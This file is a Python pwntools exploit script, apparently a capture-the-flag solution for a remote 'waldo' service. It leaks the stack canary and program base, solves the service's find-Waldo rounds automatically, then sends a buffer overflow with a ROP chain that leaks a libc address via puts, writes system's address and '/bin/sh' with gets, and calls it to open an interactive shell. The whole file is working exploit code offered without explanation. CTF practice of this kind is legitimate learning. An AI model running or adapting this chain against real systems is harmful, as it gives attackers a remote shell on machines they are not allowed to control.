from pwn import *

#r = process(["./waldo"])

r = remote("waldo.420blaze.in", 420)

r.sendlineafter("? (y/N)","y")

data = r.recvuntil("Waldo",drop=True)
r.sendline("0 0")

r.sendlineafter("? (y/N)","y"+"M"*0xf0)

#r.interactive()

data = r.recvuntil("Waldo",drop=True)
data = data.split()
data = "".join(data)

text = u64(data[0x18:0x20])-0xc43

canary = u64(data[0x8:0x10])

r.sendline("100 100")

r.sendlineafter("? (y/N)","y")
i = 0
while i<32:
	print i
	data = r.recvuntil("Waldo's found:",drop=True)
	data = data.split()
	m = len(data[0])
	data = "".join(data)
	ans =  data.index("W")
	r.sendline("%d %d"%(ans/m,ans%m))
	r.recvline()
	r.recvline()
	i+=1


print hex(text)
#0x0000000000001113 : pop rdi ; ret
#0x0000000000001383 : call qword ptr [rax]
puts = 0x998+text
gets = 0x9e8+text
r.sendlineafter("name: ","a"*0x48+p64(canary)+p64(text+0x1113)*2+p64(text+0x201f78)+p64(puts)+p64(text+0x1113)+p64(text+0x202100)+p64(gets)+p64(text+0x1113)+p64(text+0x202108)+p64(text+0x1383))

r.recvline()

libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x6f690
system = libc+0x45390

print hex(libc)

r.sendline(p64(system)+"/bin/sh\x00")

r.interactive()
